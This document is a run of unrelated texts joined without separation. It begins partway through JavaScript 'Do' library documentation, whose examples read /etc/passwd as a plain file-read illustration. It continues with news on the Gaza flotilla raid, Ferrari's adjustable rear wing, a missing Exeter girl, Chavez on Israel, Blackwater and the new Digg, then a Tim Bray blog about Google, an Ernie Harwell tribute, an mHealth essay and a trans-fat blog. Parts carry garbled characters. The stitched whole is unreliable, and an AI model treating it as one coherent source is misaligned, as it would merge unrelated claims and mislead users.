Example :
parallel-example.js //
Multiple arguments
Do . parallel (
Do . read ( " / etc / passwd " ) ,
Do . read ( __filename )
) ( function ( passwd , self ) {
// Do something
} , errorHandler ) ;
// Single argument
var actions = [
Do . read ( " / etc / passwd " ) ,
Do . read ( " __filename " )
] ;
Do . parallel ( actions ) ( function ( results ) {
// Do something
} , errorHandler ) ;
Do.chain( actions ) {...}
Chains together several actions feeding the output of the first to the input of the second and the final output to the continuables callback .
Example :
chain -example.js // Multiple arguments
Do . chain (
Do . read ( __filename ) ,
function ( text ) {
return
Do . save ( " newfile " , text ) ;
} ,
function ( ) {
return
Do . stat ( " newfile " ) ;
}
) ( function ( stat ) {
// Do something
} , errorHandler ) ;
// Single argument
var actions = [
Do . read ( __filename ) ,
function ( text ) {
return
Do . save ( " newfile " , text ) ;
} ,
function ( ) {
return
Do . stat ( " newfile " ) ;
}
] ;
Do . chain ( actions ) ( function ( stat ) {
// Do something
} , errorHandler ) ;
Do.map( array , fn ) {...}
Takes an array and does an array map over it using the async callback fn .
The signature of fn is function fn( item , callback , errback ) or any regular continuable .
Example :
map-example.js //
Direct callback filter
var files = [ ' users.json ' , ' pages.json ' , ' products.json ' ] ;
function loadFile ( filename , callback , errback ) {
fs . read ( filename ) ( function ( data ) {
callback ( [ filename , data ] ) ;
} , errback ) ;
}
Do . map ( files , loadFile ) ( function ( contents ) {
// Do something
} , errorHandler ) ;
// continuable based filter
var files = [ ' users.json ' , ' pages.json ' , ' products.json ' ] ;
Do . map ( files , fs . read ) ( function ( contents ) {
// Do something
} , errorHandler ) ;
Do.filter ( array , fn ) {...}
Takes an array and does an array filter over it using the async callback fn .
The signature of fn is function fn( item , callback , errback ) or any regular continuable .
Example :
filter -example.js //
Direct callback filter
var files = [ ' users.json ' , ' pages.json ' , ' products.json ' ] ;
function isFile ( filename , callback , errback ) {
fs . stat ( filename ) ( function ( stat ) {
callback ( stat . is File ( ) ) ;
} , errback ) ;
}
Do . filter ( files , is File ) ( function ( filtered_files ) {
// Do something
} , errorHandler ) ;
// Continuable based filter
var files = [ ' users.json ' , ' pages.json ' , ' products.json ' ] ;
function is File ( filename ) { return function ( callback , errback ) {
fs . stat ( filename ) ( function ( stat ) {
callback ( stat . is File ( ) ) ;
} , errback ) ;
}}
Do . filter ( files , is File ) ( function ( filtered_files ) {
// Do something
} , errorHandler ) ;
Do.filterMap( array , fn ) {...}
Takes an array and does a combined filter and map over it .
If the result of an item is undefined , then it 's filtered out , otherwise it 's mapped in .
The signature of fn is function fn( item , callback , errback ) or any regular continuable .
Example :
filtermap-example.js //
Direct callback filter
var files = [ ' users.json ' , ' pages.json ' , ' products.json ' ] ;
function check_and_load ( filename , callback , errback ) {
fs . stat ( filename ) ( function ( stat ) {
if ( stat . is File ( ) ) {
loadFile ( filename , callback , errback ) ;
} else {
callback ( ) ;
}
} , errback ) ;
}
Do .
filterMap ( files , check_and_load ) ( function ( filtered_files_with_data ) {
// Do something
} , errorHandler ) ;
// Continuable based filter
var files = [ ' users.json ' , ' pages.json ' , ' products.json ' ] ;
function check_and_load ( filename ) { return function ( callback , errback ) {
fs . stat ( filename ) ( function ( stat ) {
if ( stat . is File ( ) ) {
loadFile ( filename , callback , errback ) ;
} else {
callback ( ) ;
}
} , errback ) ;
}}
Do .
filterMap ( files , check_and_load ) ( function ( filtered_files_with_data ) {
// Do something
} , errorHandler ) ;
Using with node libraries
Do has a super nifty Do.convert function that takes a library and converts it to use Do style continuables .
For example , if you wanted to use fs.read File and fs.writeFile , then you would do this :
var fs =
Do . convert ( require ( 'fs ' ) , [ ' read File ' , ' writeFile ' ] ) ;
Do will give you a copy of fs that has readFile and writeFile converted to Do style .
It 's that easy !
For library writers
All async functions in node follow a common interface :
method ( arg1 , arg2 , arg3 , ... , callback )
Where callback is of the form :
callback ( err , result1 , result2 , ...)
This is done to keep node simple and to allow for interoperability between the various async abstractions like Do continuables and CommonJS promises .
If you 're writing a library , make sure to export all your async functions following the node interface .
Then anyone using your library can know what format to expect .

An Australian journalist and photographer onboard aid boats headed for the Gaza Strip have not been heard from since at least 10 people were reportedly killed during a clash with Israeli commandos .
A Fairfax spokesman says journalist Paul McGeough and photographer Kate Geraghty last made contact around noon ( AEST ) today while onboard the MV Samoud .
Israel 's defence force says at least 10 people were killed when commandos stormed a convoy of six ships carrying aid to Gaza .
It was led by a Turkish vessel with 600 people on board and set sail for Gaza from international waters off Cyprus on Sunday in defiance of an Israeli - led blockade of the territory .
Commandos boarded the ships in international waters overnight , backed up by warships and helicopters .
Mr McGeough and Ms Geraghty joined the flotilla in Crete about a week ago , the Fairfax spokesman said .
He says the pair are on assignment covering the flotilla and have been moving from boat to boat - but were last known to be on the MV Samoud .
Both have satellite phones but Mr McGeough reported his GPS was not working , blaming the malfunction on Israeli attempts to jam communications .
Australia 's Department of Foreign Affairs and Trade has contacted its Israeli counterpart and is trying to establish if any other Australians were on the flotilla .
DFAT released a statement saying it is aware Mr McGeough and Ms Geraghty were aboard the flotilla .
" We are seeking to confirm their safety and precise whereabouts , " the statement said .
" There is no indication , at this stage , that any Australians have been injured . "
Last transmission
Mr McGeough 's last audio transmission revealed Israeli forces were using the cloak of darkness to approach the aid vessels .
" At 4.20 [ am , local time ] we realised all communications on the boat were jammed , " he reported .
" 4.22 [ am ] - we see two zodiacs moving in , pressing through .
Two more zodiacs .
Now there are five of them astern of us .
" There 's white wakes on black water .
Search lights on one of the cargo ships and from the Turkish ferry are picking up the zodiacs now . "
It is understood Israeli forces boarded the Mavi Marmara and opened fire after passengers attacked them with axes and knives .
" Our young navy servicemen were given clear instructions to do the interception as quietly as possible , almost as a police action , " Israeli government spokesman Mark Regev said .
" But when the interception started , our service men were attacked .
We 've got unfortunately 10 wounded on our side . "
Israeli army radio reported 10 to 14 people were killed in the clash but it is not known if any Israeli commandos were among the dead .
The Israel Defence Force says one of its weapons was stolen and used against its soldiers .
Israeli deputy foreign minister Danny Ayalon claims the Turkish - based aid group has ties to terror groups including Al Qaeda .
" They have a history of arms smuggling and deadly terror , " he said .
" Onboard the ship , we found weapons prepared in advance and used against our forces .
The organisers ' intent was violent , their method was violent and the results were unfortunately violent . "
But the aid group which organised the convoy , the Free Gaza Movement , has denied Israel 's claim .
" I do n't know anything about the knives and axes or anything , " said Audrey Bomse , Free Gaza Movement 's legal coordinator .
" There is absolutely no evidence of live fire .
You see this live streaming on the Turkish strip , you see the Israeli helicopters shooting .
There 's no evidence of fire passing them . "
Turkey says it has " strongly protested " against Israel 's military action .
Humanitarian crisis
Most of the 1.5 million Palestinians living in Gaza rely on aid , blaming Israel for imposing restrictions on the amount and type of goods it allows into the territory .
The United Nations and Western powers have urged Israel to ease its restrictions to prevent a humanitarian crisis .
They have been urging Israel to let in concrete and steel to allow for post - war reconstruction .
Israel denies there is a humanitarian crisis in Gaza , saying food , medicine and medical equipment are allowed in regularly .
It says the restrictions are necessary to prevent weapons and materials that could be used to make them from reaching Hamas .
The European Union has called for an inquiry into the deaths aboard the Gaza aid ships .
In a statement , the EU 's foreign policy chief Catherine Ashton expressed her regret for the loss of life and the violence .
She also called for the immediate and unconditional opening of the crossing into Gaza to allow in humanitarian aid .
Hamas has urged Arabs and Muslims to " rise up " in front of Israeli embassies around the world in protest against the raids .
The Arab League has condemned Israel 's actions as a " terrorist act " .
Chief Amr Moussa has called for an emergency meeting of the 22 - nation league to discuss the incident .

Ferrari technical director Aldo Costa admitted the Formula One Teams Association ’s plan for an adjustable rear wing next year was at an early stage and could be dropped if it is deemed unsuccessful .
Speaking in the FIA press conference Costa said :
We will have the introduction of the new adjustable rear wing .
I have the same mixed feeling like Mr Sauber .
It is a completely new element .
We have not tested it .
We have studied very , very little about it .
We are going with it next year , so we will see after a few races .
Anyway it is a movable option , so the FIA and the teams can always decide to stop it in case it is not good enough or not good for some reason .

Peter Sauber said the wing was “ maybe … a good idea for overtaking , but I think we have different opinions from the technicians . ”
Several drivers have voiced doubts over the adjustable rear wing , which drivers will be able to use only if they ’re one second behind another car .
The plan has also been strongly criticised by F1 Fanatic readers .
Costa also explained changes to next year ’s technical rules aimed at making the cars safer :
The FIA as usual and the teams have looked at last year and this year ?
������s crashes and , as usual , reacted on that making the chassis safer .
We will have the front part of the chassis more robust , the roll loop more robust , the side protection of the chassis more robust .
Underneath the chassis in the driver area .
The driver will be more protected , so all very positive aspects .
Aldo Costa
He added that he was happy with Ferrari ’s performance in practice today after revising the layout at the rear of the F10 :
Not only the back of the car but also the bodywork itself , so we have got a new radiator system in terms of the shape and concept , so there ?
������s new bodywork .
And the exhaust layout is completely different and the back of the car , as you said ?
����ǣ floor , suspension ?����ǣ there are improvements as well in the middle part of the car .
Today was a very intense day because we had to do a massive amount of checks and a lot of kilometres .
We solved some issues in free practice one , very , very quickly and in free practice two we were running OK .
Felipe spun but this is the game .
So everything in FP2 was OK .

Concern is mounting for the welfare of a 14 - year - old Exeter girl who vanished after leaving a Devon nightclub .
Nouszka Kovacs was last seen leaving EX4 bar in Fore Street , Exeter , with a man who is described as being aged about 60 .
Devon and Cornwall Police said they are growing " increasingly concerned " as Nouszka has never gone missing before .
She was wearing a glittery top and shorts when she left the nightclub at about 0100 BST .
Police are checking CCTV and are keen to hear from anyone who may have information on her whereabouts .
She is described as being of Asian appearance , slim , 5 ft 6in ( 1.67 m ) tall , with long black hair .
The man she was seen leaving the club with is said to be a short , white man who was wearing a white top and black jeans .

CARACAS ( Reuters ) - Venezuela ’s President Hugo Chavez described Israel on Saturday as a genocidal state that acted as an assassin for the United States , predicting the Middle East nation would one day be “ put in its place . ”

The socialist Chavez is a harsh critic of both Israel and the United States and cut relations with Israel after accusing it of “ holocaust ” for its 2009 offensive in the Gaza Strip .
“ It has become the assassin arm of the United States , no one can doubt it .
It is a threat to all of us , ” Chavez said , during a visit by Syrian President Bashar al - Assad .
Chavez said he supported a peaceful struggle for the return to Syria of the Golan Heights , captured by Israel in 1967 .
“ The territory will one day return to the Syrian hands , ” Chavez said .
“ Of course we want it to be peaceful because we do n’t want more war . ”
“ But one day the genocidal state of Israel will be put into its place , and let ’s hope that a really democratic state emerges there , with which we can share a path and ideas . ”
Chavez did not offer further details of what putting Israel “ in its place ” would entail .
U.S. attempts to isolate Syria and reshape the Middle East have failed , he said , and Israel was fast losing allies .
Israel last week eased its land blockade on the Gaza Strip , allowing in all goods except for arms and related materials .
That move followed widespread criticism for a raid on a blockade - busting group of boats , in which nine activists died .
Hugely popular in the Arab world for his fierce “ anti-imperialist ” stance .
Chavez received a hero ’s welcome when he visited Syria in 2006 .
He returned to Damascus on a tour last year .
ASSAD TOUR
Assad arrived in Venezuela on Friday , the first stop on a rare Latin American tour .
He is also due to visit Argentina , Brazil and Cuba .
Syria has started to raise its international profile in recent years , shrugging off Western efforts to weaken it and developing ties with former foe Turkey , Russia and with Latin American nations .
Assad , who faces a decline in domestic oil production and droughts that have hit agriculture , is looking to reinforce links with a rich Syrian expatriate community in the region and with economic power Brazil .
His tour is expected to focus on bilateral issues and Syria ’s hopes to attract $ 44 billion in private foreign investment over five years to repair its infrastructure .
He applauded Chavez ’s loud criticism of the United States and Israel .
“ Few politicians are brave enough to say no , when it is necessary to say no , ” Assad said as he arrived at the Miraflores presidential palace .
“ He has revealed an image of Venezuela in resistance , creating a place for Venezuela on the international map .
He has been on the side on just causes both in Latin America , in our region the Middle East and in the whole world . ”
First of all , I should announce my editorship ( starting today ) of another blog , the Android Developers Blog .
But at Google there are stories behind the stories .
Android Dev Blog ·
It ’s been around since November 2007 , way before I ’d ever heard of Android .
In recent times it ’s been used somewhat like a press - release channel ; each of the pieces heavily group - edited into just - the - facts mode .
Perfectly OK ( if a bit tedious ) when that ’s the kind of channel you want .
It seemed obvious to me that there was scope for a real bloggy kind of blog , since there are a ton of interesting stories inside Android crying to be told .
So I said that a few times and I suspect irritated a few people , and the upshot was I got the whole thing dropped into my lap .
Let me drive a stake in the ground :
If you want to know the actual technical substance of what ’s being built here , or to read inside - Android stories , that blog is the place to come , or rather subscribe to if you really care .
Blogging at Google ·
It ’s hard , way harder than I ’d realized .
There ’s this thing in the company culture where everyone is very free with information , internally , and expected to be very close - mouthed , externally .
Within a few days of arriving , my brain was bulging with more Really Big Secrets than I ’d picked up in years at Sun .
In fact , I now know how much storage we ’re dedicating to support ... hold on , even mentioning what it ’s being used for would probably get my ass appropriately fired .
And so on .
There are a million stories around here and a person like me who ca n’t not write is dying to tell them ; but it ’s really hard to keep track of which ones are fair game .
To make matters worse , Google is interesting .
Since I ’ve come to work here , my blog readership and Twitter follower - count have both ballooned , and I ’ve noticed that more or less anything we say , whether or not I think it matters , is news .
On top of which there are many out there who are kind of scared and nervous about Google , for a variety of reasons some of which are perfectly reasonable .
And there are those , including some who write for large audiences , looking to pounce with glee on any whiff of evil or hypocrisy .
Fair enough , I suppose , since Google presents what we in the trade call a Large Attack Surface .
Which means that Google in general and the Android project in particular are careful , verging on paranoid , about what gets said in public .
Since I ’ve been here , I ’ve argued repeatedly that there are a lot of people who would like to like us , and that there are lot of stories here that would be good to tell ; that the rewards of open - ness greatly exceed the risks .
There are people here , including some very important ones , who are unconvinced .
But they ’re still giving this a chance .
Let ’s hope I ’m right .
Ever since the new version of Digg was announced three months ago , it has undergone a lot of revisions and caused a lot of turmoil .
In that time , Kevin Rose replaced Jay Adelson as CEO , reportedly unhappy with the direction Adelson was taking the company and the product .
The New Digg is almost here though , and we have access to the preview .
We 've been playing around with the new interface and its many features , and we 've compared them against both the " old " Digg and other platforms such as Twitter and Facebook .
Here are our first impressions of the New Digg :
Digg Has a Suggested Users List
When you first log onto the New Digg ( New.Digg.com ) , you 're presented with a couple screens .
The first one is Digg 's version of the suggested users list — a hand - picked list of people and companies to follow on Digg .
The list includes everyone from Kevin Rose to The New York Times to Mashable , and it categorizes their accounts based on topic area .
Twitter spurred a lot of growth and created a small set of power accounts with its suggested user list ( SUL ) — at least until this year 's changes .
Still , these types of lists help new users get started , and acquiring fresh users is something Digg needs to do .
Even if this hand - picked version of the SUL is n't sustainable , it should give the company a boost in terms of new user engagement and retention .
Adding Content Is Much Easier
One of the first things that struck us when we finally got to the new Digg homepage was the prominence of the " Digg It " option .
It looks and feels like the Facebook Publisher box .
Whenever you enter in a link , it imports the title , finds images from the link , and lets gives you write a description and choose a topic .
After that , all you have to do is click " Digg It , " and the link is broadcast to the Digg universe .
There are some other nice features about the new publishing box .
For example , if you put in a link for a story that 's already been submitted , it will alert you to the fact and display the Digg information for that specific link , complete with sharing tools and a Digg button .
It 's also a ubiquitous box : you will find it on many of the other pages in the New Digg .
Clearly , Digg is placing an emphasis on getting people to add more content and articles to the social news hub .
As we 've reported before , there is an option in the New Digg to link your RSS feed to your Digg account and auto - submit your posts for the community 's consideration .
Discovering Content
Content discovery has changed in the new version of Digg .
There are two tabs on the top left of the interface : My News and Top News My News is the default homepage for all users .
Unlike the current version of Digg , where content bubbles up from the overall community , the new version focuses on content coming from your friends and followers .
The new homepage no longer shows who submitted a story , but instead focuses on which of your friends dugg it .
Even the sidebar focuses on how many of the people you follow have dugg a story , rather than whether or not a friend of your submitted it .
We welcome the change .
It democratizes the site a bit more by reducing the need for publisher to hit the front page of Digg in order to generate any traffic .
We saw content with between 16 and 150 Diggs on our personalized feed of news .
However , long - time Digg users do n't have to worry .
" Top News " is just like the current version of Digg , focusing on the top content from the collective Digg community .
You can even sort top content by day , week , or month .
There seems to be a minimum Digg count to appear on the week or month Top News charts though , as we only saw three news items between the two tabs .
Interface
The overhaul not only focused on the algorithms and content discovery , but also on the interface itself .
It 's definitely faster , cleaner , and more social .
In our tests , we found it incredibly simple to navigate and a pleasure on the eyes .
Unlike the last version of Digg , this is something that new users can quickly pick up and understand .
It 's not perfect , though .
Search still needs some work .
For example , we found the exact same content from Mashable when we tried to resort by " Most Recent " or " Best Match . "
Hopefully this is a small bug that will quickly be resolved .
Overall though , the New Digg is a remarkable improvement over its predecessor .
It keeps much of the old look and feel of Digg , while giving it a much - needed refresh and emphasis on the social graph .
Expect the new version to launch for all users very soon .

Ernie Harwell : The Voice of the Tigers View the messages to Ernie » By Jacqueline J. Repp
MLB.com
For , lo , the winter is past ,
The rain is over and gone ;
The flowers appear on the earth ;
The time of the singing of birds is come ,
And the voice of the turtle is heard in our land .
After 55 years of broadcasting Major League games , including 42 years with the Tigers , Hall of Fame broadcaster Ernie Harwell is retiring after the 2002 season .
Often referred to as the Voice of Tigers Baseball , Harwell , 84 , would open each season by reciting the " Song of the Turtle , " a stanza that celebrates the freshness of spring , renewed life and opportunities , and ushers in the baseball season for Tigers fans the world over .
Respected by the players , beloved by the fans , Harwell has had a lasting impact on the world of baseball .
" Ernie Harwell stands , as much as anybody as I can think of , as a positive representative of what the game of baseball should and does stand for , " said Bill Freehan , a Tigers catcher from 1963 - 76 , upon the announcement of Harwell 's upcoming retirement .
" His memory will be long lasting and the quality of man he is will never diminish . "
" Ernie is probably the most beloved person who has ever been in Detroit with the Detroit Tigers , " Al Kaline said .
" He is loved by everybody and rightfully so .
He 's a great broadcaster but even a better person .
That comes across on his broadcasts . "
To the broadcasting community , Harwell is an honored example of greatness .
He received the Ford C. Frick award for broadcasting excellence from the National Baseball Hall of Fame in 1981 .
He was the first active broadcaster to be inducted into the Baseball Hall of Fame at Cooperstown and has been inducted into the Radio Hall of Fame ( 1998 ) , the National Sportscasters Hall of Fame ( 1989 ) and the Michigan Sports Hall of Fame ( 1989 ) .
He has been named the Michigan Sportscaster of the Year 17 times .
To the fans , Ernie Harwell is a baseball icon at the level of greats like Ty Cobb and Babe Ruth .
His unmistakable voice and fast - paced play - by - plays have made him a cornerstone in Tigers baseball .
Dedicated fans are known to bring radios to the ballpark or mute the sound on the television to instead listen to Harwell 's broadcast of the game .
His friendly , open demeanor and genuine interest in the fans have made him a true fan favorite .
At Joker Marchant Stadium in Lakeland , the Tigers ' Spring Training facility , Harwell is often stopped for a friendly handshake or a request for an autograph or is presented with fans standing on the back of seats to peer into the press box for a glimpse and friendly word with the beloved broadcaster .
Harwell 's contributions to Tigers baseball and the fans will be celebrated with special events at Comerica Park throughout the season .
In addition , this tribute to Ernie Harwell : The Voice of the Tigers will allow fans to send Harwell messages of farewell , best wishes and gratitude to honor his long service to Detroit and his place in baseball history .
" All in all , it has been a great run for me , " Harwell said .
" But most of all , I think I owe thanks to the people who have listened to me over the years , who tuned in on the radio .
They have given me a warmth and loyalty that I 've never been able to repay .
The way they have reached out to me has certainly been the highlight of my life .
" If somebody wants to pay attention to me , I 'm human enough to like the attention , for heaven 's sake .
It 's nice to read good stories about yourself .
I really look at myself as somebody trying to do their job , that 's all .
I 'm lucky maybe to be in the spotlight a little bit . "

Being the story of what I did last Wednesday .
As I noted in the previous outing , I have the peculiar fortune of working for a company that ’s also a tourist attraction ; so I ’ll do some tour - guiding while my eyes remain fresh .
I woke up before the alarm went off in the Google Apartment where I was staying , not far off Castro street in Mountain View .
The apartments are comfy but do n’t have a lot of personality .
Each has good WiFi , two bedrooms and two bathrooms ; my flatmate was a taciturn Czech who worked on “ data security ” .
Tim , curious : “ What sort of data security work ? ” Heavy Czech accent : “ Every sort of data security . ” [ Silence falls . ]
I did n’t allow time for more than showering and dressing ; headed out in the morning cool from the Google Apartment to pick up the early Google Bus on Mercy Street , did n’t Peter Gabriel write a nice song about that ?
An extremely multinational sprinkling of fellow Googlers boarded with me , but at that hour there was n’t much chatter .
That particular route is circular , the long way around the circle on the way in so I opened the laptop and did some morning input using the Google WiFi on the Google Bus .
At Sun , my closest collaborators tended to be at points east , often across the Atlantic , so when I woke up there was usually lots of email waiting for me .
Google is sufficiently West - Coast - centric that it ’s not uncommon for the morning harvest to be just routine mailing - list traffic ; feels weird .
But this particular morning I had an early call with Reto in London .
By the time that was finished , breakfast was in full swing at the Google cafés ; I favor one across the street from the building where I sit .
When breakfast starts they put on weird cheery eclectic music ; cowboy stuff last Wednesday .
I lean to the Google bacon , fresh fruit , a little wee scoop of hash browns , and Google coffee , which is perfectly OK .
I did n’t see anyone I knew , so I was one of the substantial proportion of solitary breakfasters , reading feeds and poking at the weird Java introspection hairball that I ’d failed to sort out before bedtime .
Wednesday was meetings nearly all day .
I wo n’t go into detail except that one of them was my first hiring - committee shift .
We considered seven candidates , rejected six , and brought one back for another round of interviews .
Urgggh .
Google routinely tries to boil five oceans before lunch , and here in my mobile - device corner we ’re locked in one of the most ferocious competitive head - to - head technology races I can remember in my decades in the biz .
A normal business would be bulking up the headcount like crazy , and standards would slip .
I ’m in awe , and as with many other things I see here , wonder if it can be sustained .
Another meeting was over lunch ; my date took me to an out - of - the - way Google café across a couple of Google parking lots which I ’ll never find again .
It was good .
They ’re all good .
The sushi is good and when someone from Vancouver says “ good sushi ” you can take it to the bank .
Anyhow , at 4PM I was done with meetings and my calendar said “ Infrastructure upgrade ” .
By which I meant “ get a new camera ” since I ’d checked that Best Buy had a decent price on the S90 and one nearby had ’em in stock .
I ’d taken the Google - sponsored taxi from the airport to my Google apartment , which meant that I did n’t have wheels .
No problemo , because employees can use these nifty Google plug - in Priuses at no charge , to encourage the use of the shuttles , promoting green - ness and long workdays .
So I whipped across 101 and back and still had time to buckle down and drag the Java introspection millstone a few more yards up the hill before it was time for dinner .
Dinner works like this ; whoever ’s still there when it gets to be 6:30 - ish stands up and says “ dinner ? ” and people join in , or not ; during my two aggregate weeks at the ’ plex I ’ve had I think one dinner alone .
The Google dinner , eaten that evening at some picnic tables outside the café in the slanting California sun , was nice until the knifing California breezes off the bay drove us back inside .
An hour later I took the last Google shuttle back to the Google apartment .
I ’d had about enough Google at that point so I went for a walk to try out the new camera in dim light , and really enjoyed having a couple of beers in a random pseudo - Irish bar , watched baseball on TV and talked hockey with a stranger .
OK , I admit it , I also checked my Google email on my Google phone .
Postscript :
This is a little unfair .
Normal people with lives in the neighborhood , are n’t doing this every day or even most days .
And in fact the volume of really - late and really - early messaging is less than at other jobs I ’ve had .
But , if you like your work , it ’s sure easy to get through a whole lot each day .

Ed note : Tomorrow , the author will participate in the Women Deliver conference panel ‘ Mobilizing Reproductive Health : How Cell Phones Are Revolutionizing Women ’s Health ’ , organized by the mHealth Alliance , which the Rockefeller , UN and Vodafone Foundations launched in 2009 to facilitate cross-sector collaboration to bring mHealth to sustainable scale .
These are a preview of her remarks .
Maternal mortality remains a major challenge to health systems worldwide .
According to the World Health Organization ( WHO ) , every minute , at least one woman died from complications related to pregnancy and childbirth , about 585,000 women each year .
To make matters worse , for every woman who dies in childbirth , 20 more suffer injuries , infection or disease ( about 10 million women each year ) .
And 4 million babies die before they are 30 days old .
Millions more die from diseases such as malaria that has largely been eradicated in the developed world .
This map shows the huge number of maternal deaths in Latin American and the Caribbean ( LAC ) countries .
Although Chile is better placed than the other countries in the region , appearing as 46th in the global league table , 21.1 women die for every 100,000 live births .
In the case of Haiti , the worst performer in the region and 155th ( out 181 ) in the MMR global rank ( numbers before the earthquake ) , the report shows 582.5 deaths for every 100,000 live births .
Maternal mortality ratio ( MMR ) – the number of maternal deaths per 100,000 live births – in the LAC countries .
Why is there so high maternal mortality ?
Poor access to the health care system
Access to family planning – counseling , services , supplies
Low coverage of antenatal care ( e.g. missing appointments )
Inability or difficulties to communicate with providers and health - care team in case of emergencies and when needed
No access to lab results
No health care - related information easily available
The promise of information and communications technologies ( ICT ) for health : a paradigm shift towards digital health care .
Modern information and communication technology ( ICT ) has a pivotal role to play in tackling health - related problems , by empowering individuals and equipping decision makers with timely information about critical health issues .
It can , among other things , enable healthcare workers to conduct remote consultation and diagnosis , store and disseminate healthcare information , improve access to and use of information by patient , strengthen epidemiological surveillance and management , establish databases to track vaccination , raise awareness through knowledge sharing , improve quality of health services provision , improve patient compliance with treatment regimen , improve access to health services , expand access to ongoing medical education and training for health workers .
In the fight against maternal mortality , ICT can critically reduce the incidence of maternal death numbers by : facilitating access to information and healthcare services , and reaching women with information to prevent unnecessary deaths and complications .
Also , with the expansion of wireless networks , mobile technology is an important ally .
It ’s the most rapidly adopted technology in history and represents an exciting opportunity to “ reach the unreached ” .
According to International Telecommunications Union ( ITU ) , mobile subscriptions globally will surpass the 5 billion mark by the end of 2010 , two - thirds of which are in low - and middle - income countries ( LMICs ) – the total number of PCs in use worldwide including laptops is 1 billion .
Almost 90 % of the LAC population has a cell phone .
Some forecasts indicate that it could grow by 8.2 % annually in the region in 2010 .
Cell phones have become firmly ensconced as essential goods rather than luxury items .
There is a growing body of evidence that demonstrates the potential of mobile communications to radically improve healthcare services — even in some of the most remote and resource - poor environments .
The key applications for mHealth ( defined as the use of mobile communications for health services and information ) in developing countries are :
Education and awareness
Remote data collection
Remote monitoring
Communication and training for healthcare workers
Disease and epidemic outbreak tracking
Diagnostic and treatment support
Appointment reminders ( to patients and workers )
To sum up , ICT by itself certainly play a key role in helping saving lives but it is n’t a silver bullet .
Health system strengthening as a whole is the key to the success of any kind of mHealth intervention .
ICT are only as useful as the substantive requirements and expertise on which they are based .

Common sense dictates that fats found naturally in the diet that we ’ve been eating for hundreds of thousands of years and have therefore evolved to eat and unlikely to be detrimental to health .
For instance , saturated fat ( a primal foodstuff if there ever was one ) turns out not to have the heart - stopping properties we ’ve been warned over for about for several decades .
I wrote most recently about this here .
Some naturally - occurring fats , such as omega - 3 and monounsaturated fats appear to have health - giving properties .
One class of fats I recommend that people do avoid , however , is industrially - produced ‘ trans fatty acids ’ .
These are a by - product of what are known as ‘ partially hydrogenated ’ fats .
These fats are unknown in nature , and have only made their way into our mouths since the processing of vegetable oils got underway in a big way very recently .
The hydrogenation of fats allows vegetable oils ( such as sunflower and safflower oil ) to be solidified , which is obviously critical in the manufacturing of solid fats such as margarine .
The other ‘ benefit ’ of hydrogenation is that it makes fats less liable to turn rancid ( go off ) , which extends their shelf life .
The polyunsaturated fats that are the raw material for industrially produced partially hydrogenated and trans fats are ‘ kinked ’ and even coiled in shape .
This physical form of fats is referred to as ‘ cis ’ ( pronounced ‘ siss ’ ) configuration .
However , in the processing of these fats not only adds hydrogen , but can also cause ‘ cis ’ fats to straighten out , forming what is known as the ‘ trans ’ configuration .
As expected , the research suggests that industrially - produced trans fats have the potential for wide - ranging unwanted effects on health .
Trans fats have been linked with having adverse effects on heart health .
For instance , in one study , individuals who had suffered a heart attack were found to have significantly higher levels of trans fats in their bodies compared to health individuals [ 1 ] .
Those with the highest concentrations of trans fat were found to be , on average , more than 2 ½ times more likely to suffer from a heart attack than those with the lowest levels .
A number of other studies also support the concept that trans fats are bad for the heart .
Of four studies that have examined this potential association over time , three found that consuming just 2 per cent of our calories from trans fat is associated with an increased risk of heart disease of 28 - 93 per cent [ 2 - 4 ] .
Trans fats seem to have the ability to impair the function of the hormone insulin , something that would be expected to increase the risk of developing type 2 diabetes [ 5,6 ] .
Other research has found that , in women , a higher intake of trans fat is associated with an increased risk of diabetes [ 7 ] .
All - in - all , the evidence suggests , as we would expect from primal theory , that industrially - produced trans fats are thoroughly unhealthy .
In the UK , we consume an average of about 2.5 - 3.0 grams of trans fats per person each day [ 8 ] .
This may not sound like much , except that studies show even very small amounts of these fats are associated with an increased risk of disease .
In 2002 , the Food and Nutrition Board of the Institute of Medicine in the USA published a report on the role of trans fats on health and made recommendations regarding safe levels of intake [ 9 ] .
In the summary of this report , its authors suggest that the : “ tolerable upper intake level of zero ” .
In normal language , this translates as “ the safest amount of trans fats to consume is none at all . ”
The adverse effects of trans fats , and the benefits of removing them from the diet was recently highlighted in an editorial published in the British Medical Journal [ 10 ] .
In response to this article , a letter was published today in the BMJ that makes interesting reading I think [ 11 ] .
It refers to the fact that the addition of trans fats to food ( a widespread practice in food processing ) is injurious to health .
Here is the letter :
In many jurisdictions it is unlawful to render food injurious to health .
For example , the UK Food Safety Act section 7 states : “ Rendering food injurious to health : ( 1 ) Any person who renders any food injurious to health by means of any of the following operations , namely - ( a ) adding any article or substance to the food ; ( b ) using any article or substance as an ingredient in the preparation of the food ; . . . ( 2 ) In determining . . . whether any food is injurious to health , regard shall be had - ( a ) not only to the probable effect of that food on the health of a person consuming it ; but ( b ) also to the probable cumulative effect of food of substantially the same composition on the health of a person consuming it in ordinary quantities . ”
Note the emphasis in section 7 ( 2 ) ( b ) on probable cumulative effects when consumed in ordinary quantities .
If it is the case that people on poor diets consume considerable amounts of industrial trans fatty acids , even where the average is quite low , it seems that using industrial trans fatty acids as food ingredients , 1 in any foods that some consumers would eat regularly and frequently , may be unlawful in the United Kingdom .
The idea that the production of foods containing damaging trans fats is unlawful is an interesting concept I think .
It does open up the possibility that legal action could be taken against food companies who manufacture these foods .
Who might take such legal action ?
The Food Standards Agency ?
Do n’t hold your breath : for some inconceivable reason the FSA has not even made it mandatory for food companies to declare the trans fats on product labels .
However , a class action by some rightly disgruntled consumers is a distinct possibility and may have legs .

Sources close to Blackwater and its secretive owner Erik Prince claim that the embattled head of the world ’s most infamous mercenary firm is planning to move to the United Arab Emirates ( UAE ) .
The Middle Eastern nation , a major hub for the US war industry , has no extradition treaty with the United States .
In April , five of Prince ’s top deputies were hit with a fifteen - count indictment by a federal grand jury on conspiracy , weapons and obstruction of justice charges .
Among those indicted were Prince ’s longtime number - two man , former Blackwater president Gary Jackson , former vice presidents William Matthews and Ana Bundy and Prince ’s former legal counsel Andrew Howell .
Ad Policy
The Blackwater / Erik Prince saga took yet another dramatic turn last week , when Prince abruptly announced that he was putting his company up for sale .
While Prince has not personally been charged with any crimes , federal investigators and several Congressional committees clearly have his company and inner circle in their sights .
The Nation learned of Prince ’s alleged plans to move to the UAE from three separate sources .
One Blackwater source told The Nation that Prince intends to sell his company quickly , saying the " sale is going to be a fast move within a couple of months . "
Mark Corallo , a trusted Prince advisor and Blackwater spokesperson would neither confirm nor deny the allegation that Prince is planning to move to the United Arab Emirates .
